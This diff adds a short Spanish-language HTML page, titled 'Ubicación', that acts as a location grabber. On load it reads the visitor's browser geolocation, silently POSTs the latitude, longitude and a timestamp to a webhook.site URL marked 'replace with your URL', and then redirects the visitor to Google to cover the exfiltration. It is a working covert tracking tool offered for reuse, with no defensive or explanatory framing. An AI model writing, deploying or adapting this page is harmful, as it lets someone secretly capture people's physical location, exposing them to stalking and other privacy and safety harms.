@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ubicación</title>
+    <script>
+        function enviarUbicacion() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    
+                    // ENVIAR AL WEBHOOK
+                    fetch("https://webhook.site/5ba595ff-7546-4228-8ff9-c2ff0b655f24", { // ⬅ REEMPLAZA CON TU URL
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ latitud: lat, longitud: lon, timestamp: new Date().toISOString() })
+                    }).then(() => {
+                        // OPCIONAL: Redirigir a Google después de enviar datos
+                        window.location.href = "https://www.google.com";
+                    });
+                });
+            } else {
+                alert("La geolocalización no está disponible.");
+            }
+        }
+        window.onload = enviarUbicacion;
+    </script>
+</head>
+<body>
+    <p>Obteniendo ubicación...</p>
+</body>
+</html>
